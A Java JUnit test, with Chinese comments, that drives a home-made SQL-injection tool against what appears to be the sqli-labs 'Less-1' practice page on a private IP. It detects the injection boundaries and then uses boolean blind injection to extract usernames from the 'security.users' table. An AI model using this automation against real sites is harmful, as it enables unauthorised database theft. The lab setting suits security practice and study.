package com.example;

import com.pagen.examination.InjectTest.BoolBlindTest;
import com.pagen.examination.InjectTest.BoundariesTest;
import com.pagen.examination.InjectTest.Driver.Boundaries;
import com.pagen.examination.URL_Pages_Translation;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.net.URL;

/**
 * 测试类
 */
public class test1 {
    @Test
    public void test1() {
        try {
            String originUrl = "http://192.168.23.128/sql/Less-1/?id=1";
            URL_Pages_Translation page = new URL_Pages_Translation(originUrl);

            String originPage = page.getPageInfo();

            BoundariesTest boundariesTest = new BoundariesTest(page);
            Boundaries boundaries = boundariesTest.runTestPayload();

            if (boundaries == null) {
                System.out.println("未找到对应边界 ！！");
                return;
            }
            System.out.println("边界：" + boundaries.getPrefix() + "    " + boundaries.getSuffix());

            //加载bool盲注用例
            BoolBlindTest boolBlindTest = new BoolBlindTest(page, boundaries);

            //输出获取数据库结果
            System.out.println(boolBlindTest.getDatas("security", "users", "username"));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public long getTimeOfPage(URL url) throws IOException {
        long start = System.currentTimeMillis();
        url.openStream();
        return System.currentTimeMillis() - start;
    }
}